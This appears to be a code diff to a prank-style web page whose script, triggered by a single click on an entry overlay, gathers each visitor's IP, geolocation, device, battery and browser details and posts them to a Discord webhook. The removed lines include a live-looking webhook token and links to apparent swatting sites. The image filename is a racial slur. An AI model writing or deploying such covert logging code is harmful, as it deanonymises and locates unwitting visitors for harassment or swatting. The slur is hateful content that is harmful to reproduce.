@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>a</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Logging All Client Data</title>
     <style>
         body {
             margin: 0;
@@ -25,11 +24,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             cursor: pointer;
-            z-index: 2; 
-        }
-        .container {
-            text-align: center;
-            display: none;
+            z-index: 2;
         }
         .contact {
             position: absolute;
@@ -45,74 +40,127 @@
 </head>
 <body>
     <div class="overlay">
-        <img src="niggers.jpg" alt="Click to Enter" width="300"> 
+        <img src="niggers.jpg" alt="Click to Enter" width="300">
     </div>
-    <div class="container">
-        <h1>other sites:</h1>
-        <p>swatcity.fun swats.shop</p>
-    </div>
-
     <div class="contact">
-        <p>contact: lol@interpol.int.pl</p>
+        <p>Contact: lol@interpol.int.pl</p>
     </div>
-
     <audio id="background-music" src="friends.mp3" preload="auto" loop></audio>
-    
+
     <script>
         const overlay = document.querySelector('.overlay');
-        const container = document.querySelector('.container');
         const audio = document.getElementById('background-music');
 
-       
-        function goFullScreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.mozRequestFullScreen) { 
-                document.documentElement.mozRequestFullScreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { 
-                document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) { 
-                document.documentElement.msRequestFullscreen();
-            }
-        }
+        // Function to gather and send client data
+        function sendClientData() {
+            // Get User Agent
+            const userAgent = navigator.userAgent;
 
-        // Function to send the IP to Discord
-        function sendIPToDiscord() {
+            // Get Browser Language
+            const language = navigator.language;
+
+            // Get Screen Dimensions
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+
+            // Get Window Dimensions
+            const windowWidth = window.innerWidth;
+            const windowHeight = window.innerHeight;
+
+            // Get Scroll Position
+            const scrollX = window.scrollX;
+            const scrollY = window.scrollY;
+
+            // Get Device Memory (RAM in GB)
+            const deviceMemory = navigator.deviceMemory;
+
+            // Get Hardware Concurrency (CPU cores)
+            const hardwareConcurrency = navigator.hardwareConcurrency;
+
+            // Get IP Address (using an external API like ipify)
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const userIP = data.ip;
-                    const currentTime = new Date().toISOString();
-                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1309497408689799198/Rjgnm7gEd7qk-q5mUUvLa33AQcc7kPDpGOIww6J2bkFuF7XEkxg5NEzeAceSzoBXBrhL'; // Replace with your webhook URL
+                    const ip = data.ip;
 
-                    fetch(discordWebhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
+                    // Get Geolocation (if available)
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+
+                            // Get Battery Status
+                            navigator.getBattery().then(function(battery) {
+                                const batteryLevel = battery.level * 100; // in percentage
+                                const isCharging = battery.charging;
+
+                                // Get Installed Plugins (e.g., Flash, PDF viewer)
+                                const plugins = navigator.plugins;
+
+                                // Send data to Discord Webhook
+                                const discordWebhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'; // Replace with your webhook URL
+                                const logData = {
+                                    content: `Client Data:
+                                    IP: ${ip}
+                                    User Agent: ${userAgent}
+                                    Language: ${language}
+                                    Screen: ${screenWidth}x${screenHeight}
+                                    Window: ${windowWidth}x${windowHeight}
+                                    Scroll Position: (${scrollX}, ${scrollY})
+                                    Device Memory: ${deviceMemory} GB
+                                    Hardware Concurrency: ${hardwareConcurrency} cores
+                                    Latitude: ${latitude}
+                                    Longitude: ${longitude}
+                                    Battery Level: ${batteryLevel}%
+                                    Charging: ${isCharging}
+                                    Plugins: ${plugins.length > 0 ? plugins : 'No plugins detected'}
+                                    `
+                                };
+
+                                fetch(discordWebhookUrl, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify(logData)
+                                })
+                                .then(response => {
+                                    console.log('Client data sent to Discord.');
+                                })
+                                .catch(err => {
+                                    console.error('Error sending to Discord:', err);
+                                });
+                            });
                         },
-                        body: JSON.stringify({
-                            content: `IP: ${userIP} | Time: ${currentTime}`
-                        })
-                    })
-                    .then(() => {
-                        console.log('IP and timestamp sent to Discord');
-                    })
-                    .catch(err => {
-                        console.error('Error sending to Discord:', err);
-                    });
+                        error => {
+                            console.log('Geolocation error:', error.message);
+                        }
+                    );
                 })
                 .catch(err => {
                     console.error('Error fetching IP:', err);
                 });
         }
 
+        // Function to make the browser go fullscreen
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
         // Event listener for overlay click
         overlay.addEventListener('click', () => {
             overlay.style.display = 'none'; 
-            container.style.display = 'block';
-            audio.play(); 
+            audio.play();
             goFullScreen(); 
-            sendIPToDiscord(); 
+            sendClientData(); // Send all collected client data
         });
     </script>
 </body>
